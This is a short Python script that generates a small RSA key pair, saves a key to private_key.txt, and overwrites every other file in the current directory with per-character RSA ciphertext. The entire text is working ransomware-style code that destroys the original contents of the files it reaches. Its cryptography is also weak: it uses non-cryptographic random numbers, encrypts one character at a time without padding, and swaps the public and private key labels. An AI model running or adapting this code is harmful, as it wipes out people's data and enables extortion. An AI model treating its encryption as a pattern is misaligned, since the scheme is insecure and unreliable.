import random
import math
import os
#pip install sympy
from sympy import isprime
#create public and private key rsa
def generate_prime(bits):
    while True:
        num = random.getrandbits(bits)
        if isprime(num):
            return num

def multiplicative_inverse(e,phi):
    #pow(base, exponent, modulus)
        return pow(e, -1, phi)

def generate_keypair(p, q):
    n = p * q
    phi = (p - 1) * (q - 1)

    # Choose e such that 1 < e < phi and gcd(e, phi) = 1
    e = random.randint(2, phi - 1)
    while math.gcd(e, phi) != 1:
        e = random.randint(2, phi - 1)     
    d = multiplicative_inverse(e, phi)
    return (e, n), (d, n)

#encrypt files
def encrypt(input_file,public_key):
    encryptmessage=[]
    e,n = public_key  
    with open(input_file,'r') as file:
        read_message = file.read()

    for char in read_message:
        #ord(char)convert to ascii
        charcontinue=pow(ord(char),e,n)
        encryptmessage.append(str(charcontinue))

    with open(input_file,'w') as file:
        messagelisto=','.join(encryptmessage)
        file.write(messagelisto)
        
    return encryptmessage

bits=128
p = generate_prime(bits)
q = generate_prime(bits)

# store private key
private_key,public_key = generate_keypair(p,q)
with open('private_key.txt','w') as private:
    private.write(str(private_key))

# scan for files and store in files
files=[]
for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "private_key.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

#encrypt every files call
for input_file in files:

    enc_message=encrypt(input_file,public_key)

    print("encrypted_message : ",enc_message)
